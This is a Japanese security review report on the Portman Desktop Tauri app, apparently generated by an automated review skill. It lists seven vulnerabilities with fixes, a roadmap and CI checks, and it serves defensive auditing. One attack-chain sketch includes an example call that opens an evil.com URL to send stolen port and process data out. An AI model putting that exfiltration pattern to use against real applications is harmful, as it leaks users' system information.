# セキュリティレビューレポート

| 項目 | 内容 |
|------|------|
| 分析日 | 2026-02-07 |
| 対象 | Portman Desktop |
| 分析範囲 | portman_desktop, portman_core, desktop (フロントエンド) |
| 技術スタック | Tauri v2 + React + TypeScript + Rust |
| 配布形態 | GitHub Releases (DMG) |
| 作成 | security-review skill |

---

## エグゼクティブサマリー

### 総合リスク評価

| 指標 | 評価 |
|------|------|
| **総合リスクレベル** | High |
| **早急な対応が必要** | Yes |
| **推定対応工数** | 5-7人日 |

### 発見された脆弱性

| リスク | 件数 | 主な内容 |
|--------|------|---------|
| Critical | 0件 | - |
| High | 2件 | 未署名配布、CSP無効化 |
| Medium | 3件 | ReDoS可能性、shell:allow-open権限、withGlobalTauri有効 |
| Low | 2件 | エラー情報露出、XSS潜在リスク |
| **合計** | **7件** | |

### キーファインディング

**最も深刻な問題**:
1. **V-003: 未署名アプリケーション配布**: macOS Gatekeeperをバイパスさせる習慣がつく → 対策: Apple Developer ID取得、コード署名
2. **V-001: CSP無効化**: XSS攻撃成功時の影響が拡大 → 対策: 適切なCSP設定を有効化
3. **V-006: withGlobalTauri有効化**: Tauri APIへの直接アクセスが可能 → 対策: 本番ビルドで無効化

**想定される最悪のシナリオ**:
> Chain-2 (サプライチェーン攻撃): 偽サイト/リポジトリから改ざん版DMGを配布 → ユーザーがGatekeeper警告を無視してインストール → マルウェアがシステムに侵入、完全掌握

### 推奨アクション（Top 3）

| 優先度 | アクション | 効果 | 工数 |
|--------|----------|------|------|
| 1 | CSP設定の有効化 (D-001) | High 1件解消、XSS防御強化 | 0.5時間 |
| 2 | withGlobalTauri無効化 (D-002) | Medium 1件解消、攻撃面縮小 | 0.25時間 |
| 3 | コード署名とNotarization (D-003) | High 1件解消、ソフトウェア完全性確保 | 2-3人日 |

---

## 脆弱性一覧

### 一覧表

| # | 脆弱性 | リスク | カテゴリ | OWASP | 対策 | 状態 |
|---|--------|--------|---------|-------|------|------|
| V-001 | CSP無効化 | High | セキュリティ設定不備 | A05 | D-001 | 未対応 |
| V-002 | ReDoS可能性 | Medium | 入力検証不備 | A03 | D-005 | 未対応 |
| V-003 | 未署名アプリケーション配布 | High | ソフトウェア完全性 | A08 | D-003 | 未対応 |
| V-004 | エラーメッセージによる情報漏洩 | Low | 情報漏洩 | A01 | D-006 | 未対応 |
| V-005 | shell:allow-open権限によるURL開放 | Medium | 権限過剰 | A01 | D-004 | 未対応 |
| V-006 | withGlobalTauri有効化 | Medium | 攻撃面拡大 | A05 | D-002 | 未対応 |
| V-007 | ラベルデータのXSS潜在リスク | Low | XSS | A03 | D-007 | 未対応 |

### リスク分布

```
High:     ██████████ 2件
Medium:   ███████████████ 3件
Low:      ██████████ 2件
```

### カテゴリ別分布

| カテゴリ | 件数 | 最高リスク |
|---------|------|----------|
| セキュリティ設定不備 | 2件 | High |
| 入力検証不備 | 2件 | Medium |
| 権限過剰 | 1件 | Medium |
| 情報漏洩 | 1件 | Low |
| ソフトウェア完全性 | 1件 | High |

---

## 攻撃シナリオ分析（ブラックハット視点）

### 攻撃チェーン

#### Chain-1: XSS経由の情報窃取・フィッシング（深刻度: High）

**目標**: ユーザーのシステム情報窃取とフィッシング誘導

**攻撃フロー**:
```
[V-001: CSP無効化]
    | XSS攻撃の成立を容易に
    v
[仮想: XSS注入点] (現状は存在しないが将来的リスク)
    | 悪意のあるスクリプト実行
    v
[V-006: withGlobalTauri]
    | window.__TAURI__ APIアクセス
    | invoke("scan_listeners") でポート/プロセス情報取得
    v
[V-005: shell:allow-open]
    | open("https://evil.com?data=...") で情報送信
    v
[目標達成: システム情報窃取 + フィッシング]
```

**阻止ポイント**: V-001 (CSP) を修正すればXSSリスクを大幅に軽減

**成功確率**: 低（現状XSS注入点がないため）
**検出難易度**: 高（ブラウザが開くだけなので気づきにくい）

---

#### Chain-2: 供給チェーン攻撃（深刻度: Critical）

**目標**: マルウェア混入による完全なシステム侵害

**攻撃フロー**:
```
[V-003: 未署名配布]
    | 正規版と区別不可能な偽バイナリ作成
    v
[ユーザー: Gatekeeper警告を無視]
    | マルウェア入りPortmanをインストール
    v
[改ざん版アプリ: 悪意のあるコード実行]
    | バックドア設置、認証情報窃取
    v
[目標達成: システム完全掌握]
```

**阻止ポイント**: V-003 (コード署名) を修正すればソフトウェア完全性を確保

**成功確率**: 中（ソーシャルエンジニアリング依存）
**検出難易度**: 中（未署名警告は出るが無視されやすい）

---

### 攻撃者視点での警告

1. **CSP設定の重要性**: Tauriアプリはwebviewを使用するため、従来のWebアプリ同様にCSP設定が重要。`null` 設定は開発時の便宜のためと思われるが、本番ビルドでは必ず適切なCSPを設定すべき。

2. **署名なし配布の信頼問題**: macOSでGatekeeperをバイパスする習慣がつくと、他のマルウェアにも同様に対応してしまう。開発者署名がなくても、チェックサムの提供や、Homebrew Caskでの配布を検討すべき。

3. **ローカルアプリでも攻撃は可能**: 「ローカルアプリだから安全」という思考は危険。マルウェア、共有マシン、または将来的な機能追加（クラウド同期等）で攻撃経路が生まれる可能性がある。

---

## 脆弱性詳細

### V-001: Content Security Policy (CSP) 無効化

| 項目 | 内容 |
|------|------|
| リスクレベル | High |
| カテゴリ | A05:2021 - セキュリティの設定ミス |
| 発見箇所 | `crates/portman_desktop/tauri.conf.json:37` |
| CVSS推定 | 6.1 (Medium-High) |

**脆弱性の説明**

`tauri.conf.json` において `"csp": null` が設定されており、Content Security Policyが完全に無効化されている。CSPはXSS攻撃を緩和するための重要な防御層であり、無効化によりスクリプトインジェクションのリスクが高まる。

```json
"security": {
  "csp": null  // 危険: CSP無効
}
```

**影響**
- **機密性**: Tauri IPC経由でシステム情報（ポート、プロセス）にアクセス可能
- **完全性**: ユーザーの意図しない操作（ラベル改ざん等）が可能
- **可用性**: 軽微（DoS攻撃は限定的）

---

### V-002: ReDoS（正規表現DoS）攻撃の可能性

| 項目 | 内容 |
|------|------|
| リスクレベル | Medium |
| カテゴリ | A03:2021 - インジェクション |
| 発見箇所 | `crates/portman_core/src/resolver.rs:23` |
| CVSS推定 | 5.3 (Medium) |

**脆弱性の説明**

Pattern型ラベルではユーザー入力の正規表現をそのまま `Regex::new()` に渡している。悪意のある正規表現を登録することで、マッチング時にCPUを過剰消費させるReDoS攻撃が可能。

```rust
LabelKeyType::Pattern => {
    if let Ok(re) = Regex::new(&label.key_value) {  // ユーザー入力をそのまま正規表現化
        pattern_labels.push((re, label));
    }
}
```

**補足**: Rustの`regex`クレートはデフォルトでバックトラッキングを制限しているため、多くのReDoS攻撃には耐性がある。しかし、複雑なパターンでは依然として性能問題が発生する可能性がある。

---

### V-003: 未署名アプリケーション配布

| 項目 | 内容 |
|------|------|
| リスクレベル | High |
| カテゴリ | A08:2021 - ソフトウェアとデータの整合性の不具合 |
| 発見箇所 | 配布形態（GitHub Releases、未署名DMG） |
| CVSS推定 | 7.5 (High) |

**脆弱性の説明**

アプリケーションがコード署名なしで配布されている。これにより：
1. ユーザーはダウンロードしたバイナリが改ざんされていないか検証できない
2. macOS Gatekeeperが警告を表示し、ユーザーがセキュリティ設定を緩和する習慣がつく
3. 中間者攻撃やミラーサイトでの改ざんリスク

---

### V-004: エラーメッセージによる情報漏洩

| 項目 | 内容 |
|------|------|
| リスクレベル | Low |
| カテゴリ | A01:2021 - アクセス制御の不備 |
| 発見箇所 | `crates/portman_desktop/src/commands.rs:12` |
| CVSS推定 | 3.1 (Low) |

**脆弱性の説明**

Tauriコマンドで発生したエラーを `.map_err(|e| e.to_string())` でそのままフロントエンドに返している。これにより、内部パス、データベース構造、システム状態などの情報が露出する可能性がある。

---

### V-005: shell:allow-open 権限によるURL開放リスク

| 項目 | 内容 |
|------|------|
| リスクレベル | Medium |
| カテゴリ | A01:2021 - アクセス制御の不備 |
| 発見箇所 | `crates/portman_desktop/capabilities/default.json:8` |
| CVSS推定 | 5.4 (Medium) |

**脆弱性の説明**

Tauri capabilities で `shell:allow-open` が許可されており、フロントエンドから任意のURLをシステムのデフォルトブラウザで開くことができる。現在のコードでは安全に使用されているが、XSS攻撃と組み合わせた場合にフィッシングリスクがある。

**現在の使用箇所**:
| ファイル | 使用目的 | URL形式 |
|---------|---------|---------|
| `ListenerCard.tsx:32` | ポートをブラウザで開く | `http://localhost:{port}/` |
| `menu.ts:57` | ヘルプ（GitHub） | `https://github.com/zeroshotlog/portman` |

---

### V-006: withGlobalTauri 有効化による攻撃面拡大

| 項目 | 内容 |
|------|------|
| リスクレベル | Medium |
| カテゴリ | A05:2021 - セキュリティの設定ミス |
| 発見箇所 | `crates/portman_desktop/tauri.conf.json:24` |
| CVSS推定 | 4.7 (Medium) |

**脆弱性の説明**

`withGlobalTauri: true` が設定されており、`window.__TAURI__` オブジェクトがグローバルに公開されている。これにより、開発者ツールやXSS経由でTauri APIに直接アクセス可能。

---

### V-007: ユーザー入力（ラベル）の表示における潜在的XSSリスク

| 項目 | 内容 |
|------|------|
| リスクレベル | Low |
| カテゴリ | A03:2021 - インジェクション (XSS) |
| 発見箇所 | `desktop/src/components/LabelBadge.tsx:6`, `ListenerTable.tsx:92` |
| CVSS推定 | 3.7 (Low) |

**脆弱性の説明**

ユーザーが入力したラベル名がReactコンポーネント内で直接レンダリングされている。ReactはデフォルトでXSS対策を行うため現状では安全だが、将来の変更でリスクが生じる可能性がある。

**現状の安全性**:
- Reactの自動エスケープ機能が有効
- `dangerouslySetInnerHTML` は使用されていない
- ラベル入力時に `.trim()` でサニタイズ（ただし部分的）

---

## 防御策提案（ホワイトハット視点）

### 対策一覧（優先度順）

| 優先度 | 対策 | 対象脆弱性 | 難易度 | 効果 | Quick Win |
|--------|------|----------|--------|------|-----------|
| 1 | D-001: CSP設定の有効化 | V-001 | 低 | 高 | Yes |
| 2 | D-002: withGlobalTauriの無効化 | V-006 | 低 | 中 | Yes |
| 3 | D-003: コード署名とNotarization | V-003 | 中 | 高 | No |
| 4 | D-004: shell:allow-openスコープ制限 | V-005 | 低 | 中 | Yes |
| 5 | D-005: 正規表現のサイズ/複雑度制限 | V-002 | 中 | 中 | No |
| 6 | D-006: エラーメッセージの抽象化 | V-004 | 低 | 低 | Yes |
| 7 | D-007: ラベル入力のサニタイズ強化 | V-007 | 低 | 低 | Yes |

---

### Quick Wins（即座に実施可能）

#### QW-1: CSP設定の有効化 (D-001)

- **対象**: V-001
- **効果**: XSS攻撃リスクの大幅軽減
- **工数**: 30分以内

**実装**:

`crates/portman_desktop/tauri.conf.json`:

```json
// Before (脆弱)
"security": {
  "csp": null
}

// After (安全)
"security": {
  "csp": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' ipc: http://ipc.localhost; font-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'"
}
```

---

#### QW-2: withGlobalTauriの無効化 (D-002)

- **対象**: V-006
- **効果**: Tauri API攻撃面の縮小
- **工数**: 15分以内

**実装**:

```json
// Before
"app": {
  "withGlobalTauri": true
}

// After
"app": {
  "withGlobalTauri": false
}
```

**検証方法**:
- アプリを起動し、開発者ツールで `window.__TAURI__` が `undefined` であることを確認
- すべての機能が正常に動作することを確認

---

#### QW-3: shell:allow-openのスコープ制限 (D-004)

- **対象**: V-005
- **効果**: 任意URL開放リスクの軽減
- **工数**: 30分以内

**実装**:

`crates/portman_desktop/capabilities/default.json`:

```json
{
  "permissions": [
    "core:default",
    {
      "identifier": "shell:allow-open",
      "allow": [
        { "url": "^http://localhost(:\\d+)?(/.*)?$" },
        { "url": "^https://github\\.com/zeroshotlog/portman.*$" }
      ]
    },
    "core:window:allow-start-dragging",
    "core:menu:default",
    "core:image:default"
  ]
}
```

---

#### QW-4: エラーメッセージの抽象化 (D-006)

- **対象**: V-004
- **効果**: 内部情報漏洩の防止
- **工数**: 30分以内

**実装**:

```rust
// commands.rs
fn handle_error<E: std::fmt::Display>(err: E, context: &str) -> String {
    log::error!("{}: {}", context, err);
    format!("An error occurred: {}", context)
}

#[tauri::command]
pub fn scan_listeners() -> Result<Vec<EnrichedListener>, String> {
    portman()
        .map_err(|e| handle_error(e, "Failed to initialize"))?
        .scan()
        .map_err(|e| handle_error(e, "Failed to scan ports"))
}
```

---

### 主要対策の詳細

#### D-003: macOSコード署名とNotarization

| 項目 | 内容 |
|------|------|
| 対象脆弱性 | V-003: 未署名アプリケーション配布 |
| 優先度 | 3 |
| 難易度 | 中 |
| 工数 | 2-3人日（初期セットアップ） |

**前提条件**:
- Apple Developer Program への登録（年間$99）
- Developer ID Application 証明書の取得
- App Store Connect API キーの作成（Notarization用）

**実装手順**:

1. Apple Developer で証明書取得
2. 環境変数設定（`APPLE_SIGNING_IDENTITY`, `APPLE_API_KEY`等）
3. tauri.conf.json で `hardenedRuntime: true` を設定
4. GitHub Actions で署名パイプライン構築

**代替案: チェックサム提供**

コード署名が困難な場合の暫定対策として、リリースにSHA-256チェックサムを提供:

```markdown
## Verification
SHA-256 checksums:
a1b2c3d4... Portman-0.1.0_universal.dmg

Verify with: shasum -a 256 Portman-0.1.0_universal.dmg
```

---

#### D-005: 正規表現のサイズ/複雑度制限

| 項目 | 内容 |
|------|------|
| 対象脆弱性 | V-002: ReDoS可能性 |
| 優先度 | 5 |
| 難易度 | 中 |
| 工数 | 1人日 |

**実装**:

```rust
const MAX_REGEX_LENGTH: usize = 256;

pub fn validate_regex_pattern(pattern: &str) -> Result<regex::Regex, String> {
    if pattern.len() > MAX_REGEX_LENGTH {
        return Err(format!(
            "Pattern too long: {} chars (max {})",
            pattern.len(),
            MAX_REGEX_LENGTH
        ));
    }

    regex::RegexBuilder::new(pattern)
        .size_limit(10 * (1 << 20))  // 10MB
        .build()
        .map_err(|e| format!("Invalid regex: {}", e))
}
```

---

## 改善ロードマップ

### 優先度マトリクス

```
          効果（リスク低減）
              大
              |   D-003      |   D-001, D-002
   計画実施   |   (署名)     |   即時実施
              +--------------+--------------
   検討       |   D-005      |   D-004, D-006, D-007
              |   (ReDoS)    |   早期実施
              小
              +--------------+--------------→
                  高             低
                     実装難易度
```

### 短期（1週間以内）

- [ ] **D-001**: CSP設定の有効化 - XSS防御層の追加
- [ ] **D-002**: withGlobalTauri無効化 - 攻撃面縮小
- [ ] **D-004**: shell:allow-openスコープ制限 - URL開放制限
- [ ] **D-006**: エラーメッセージ抽象化 - 情報漏洩防止
- [ ] **D-007**: ラベル入力サニタイズ - 入力検証強化

**マイルストーン**: Quick Wins完了、High脆弱性1件解消

### 中期（1ヶ月以内）

- [ ] **D-005**: 正規表現サイズ/複雑度制限 - ReDoS対策
- [ ] CI/CDセキュリティチェック統合（cargo audit, npm audit）
- [ ] ESLint `react/no-danger` ルール追加
- [ ] ログ監視の強化（env_logger導入）

**マイルストーン**: Medium脆弱性全件解消

### 長期（3ヶ月以内）

- [ ] **D-003**: Apple Developer Program登録
- [ ] **D-003**: コード署名とNotarization設定
- [ ] **D-003**: GitHub Actions自動署名パイプライン
- [ ] SBOM（Software Bill of Materials）生成
- [ ] 継続的セキュリティテスト導入（Semgrep, CodeQL）
- [ ] インシデント対応計画策定
- [ ] 定期セキュリティレビュー体制構築

**マイルストーン**: High脆弱性全件解消、セキュリティ成熟度向上

---

## セキュリティ上の良い実装

分析中に発見された、セキュリティ上適切な実装：

### 1. コマンドインジェクション対策

```rust
// scanner.rs:18-20
let output = Command::new("lsof")
    .args(["-nP", "-iTCP", "-sTCP:LISTEN"])  // ハードコードされた引数
    .output()?;
```

`lsof` コマンドの引数は完全にハードコードされており、ユーザー入力が引数に混入する経路はない。

### 2. SQLインジェクション対策

```rust
// repository.rs:44-60
self.conn.execute(
    "INSERT INTO labels ... VALUES (?1, ?2, ?3, ?4, ?5, ?6) ...",
    params![key_type_str, label.key_value, label.name, label.note, now, now],
)?;
```

`rusqlite` のパラメータ化クエリ（`params![]`マクロ）を使用しており、SQLインジェクションは防止されている。

### 3. 型安全なIPC

Tauriコマンドは型安全であり、フロントエンドからの入力は自動的にデシリアライズ・バリデーションされる。

```rust
#[derive(Deserialize)]
pub struct SetLabelArgs {
    pub key_type: LabelKeyType,  // enumへのパース時にバリデーション
    pub key_value: String,
    pub name: String,
    pub note: Option<String>,
}
```

### 4. 最小限のTauri権限

```json
// capabilities/default.json
"permissions": [
  "core:default",
  "shell:allow-open",  // 必要最小限
  "core:window:allow-start-dragging",
  "core:menu:default",
  "core:image:default"
]
```

ファイルシステムアクセス、ネットワークアクセス、プロセス実行などの危険な権限は含まれていない。

---

## 多層防御設計

### 推奨アーキテクチャ

```
+------------------------------------------------------------------+
|                       Portman Desktop                             |
+------------------------------------------------------------------+
|  +------------------------------------------------------------+  |
|  |                   React Frontend                            |  |
|  |  +-------------+  +-------------+  +-------------------+    |  |
|  |  | 入力検証     |  | safeOpen   |  | Reactエスケープ   |    |  |
|  |  | (length,    |  | (URL検証)  |  | (XSS防止)         |    |  |
|  |  |  sanitize)  |  |            |  |                    |    |  |
|  |  +-------------+  +-------------+  +-------------------+    |  |
|  +----------------------------+-------------------------------+  |
|                               | Tauri IPC                        |
|                               | (型安全、capabilities制限)       |
|  +----------------------------v-------------------------------+  |
|  |                   Rust Backend                              |  |
|  |  +-------------+  +-------------+  +-------------------+    |  |
|  |  | 入力検証     |  | エラー抽象化|  | パラメータ化      |    |  |
|  |  | (sanitize)  |  | (ログ分離) |  | クエリ(SQLite)    |    |  |
|  |  +-------------+  +-------------+  +-------------------+    |  |
|  +------------------------------------------------------------+  |
+------------------------------------------------------------------+
|                       Tauri Security                              |
|  +-------------+  +-------------+  +-------------------------+   |
|  | CSP有効     |  | Capabilities|  | withGlobalTauri: false |   |
|  |             |  | (最小権限)  |  |                        |   |
|  +-------------+  +-------------+  +-------------------------+   |
+------------------------------------------------------------------+
|                       配布セキュリティ                             |
|  +------------------------------------------------------------+  |
|  | コード署名 + Notarization (Apple Developer ID)              |  |
|  +------------------------------------------------------------+  |
+------------------------------------------------------------------+
```

---

## 継続的セキュリティ

### 推奨CI/CDセキュリティチェック

`.github/workflows/security.yml`:

```yaml
name: Security Checks

on: [push, pull_request]

jobs:
  rust-security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run cargo audit
        run: |
          cargo install cargo-audit
          cargo audit
      - name: Run clippy
        run: cargo clippy --workspace -- -D warnings

  npm-security:
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: desktop
    steps:
      - uses: actions/checkout@v4
      - name: Run npm audit
        run: npm audit --audit-level=high
      - name: Run eslint
        run: npm run lint
```

### 推奨ツール

| 目的 | ツール |
|------|--------|
| Rustセキュリティ | `cargo audit`, `cargo deny` |
| npmセキュリティ | `npm audit`, `snyk` |
| コード品質 | `clippy`, `eslint`, `prettier` |
| 依存関係更新 | Dependabot, Renovate |
| セキュリティスキャン | Semgrep, CodeQL |

---

## 付録

### A. 分析対象ファイル一覧

**Rustバックエンド**:
- `crates/portman_desktop/src/main.rs`
- `crates/portman_desktop/src/commands.rs`
- `crates/portman_core/src/scanner.rs`
- `crates/portman_core/src/repository.rs`
- `crates/portman_core/src/resolver.rs`
- `crates/portman_core/src/app.rs`
- `crates/portman_core/src/allocator.rs`

**設定ファイル**:
- `crates/portman_desktop/tauri.conf.json`
- `crates/portman_desktop/capabilities/default.json`

**フロントエンド**:
- `desktop/src/App.tsx`
- `desktop/src/hooks/usePortman.ts`
- `desktop/src/components/LabelEditor.tsx`
- `desktop/src/components/ListenerCard.tsx`
- `desktop/src/components/ListenerTable.tsx`
- `desktop/src/components/LabelBadge.tsx`
- `desktop/src/menu.ts`

**依存関係**:
- `desktop/package.json`
- `crates/portman_desktop/Cargo.toml`
- `crates/portman_core/Cargo.toml`

### B. 用語集

| 用語 | 説明 |
|------|------|
| CSP | Content Security Policy - ブラウザのセキュリティポリシー |
| XSS | Cross-Site Scripting - スクリプト注入攻撃 |
| ReDoS | Regular Expression Denial of Service - 正規表現によるDoS攻撃 |
| OWASP | Open Web Application Security Project |
| CVSS | Common Vulnerability Scoring System |
| Notarization | Apple公証 - macOSアプリの安全性検証 |
| IPC | Inter-Process Communication - プロセス間通信 |
| Gatekeeper | macOSのセキュリティ機能（未署名アプリを警告） |

### C. 参照資料

**Tauri公式ドキュメント**:
- [Tauri v2 Security](https://v2.tauri.app/security/)
- [Tauri v2 CSP](https://v2.tauri.app/security/csp/)
- [Tauri v2 Capabilities](https://v2.tauri.app/security/capabilities/)
- [Tauri v2 macOS Code Signing](https://v2.tauri.app/distribute/sign/macos/)

**OWASPリソース**:
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

**セキュリティアドバイザリ**:
- [Tauri Shell Plugin Security Advisory (GHSA-c9pr-q8gx-3mgp)](https://github.com/tauri-apps/plugins-workspace/security/advisories/GHSA-c9pr-q8gx-3mgp)

---

*本レポートは security-review skill により生成されました*
*最終更新: 2026-02-07*
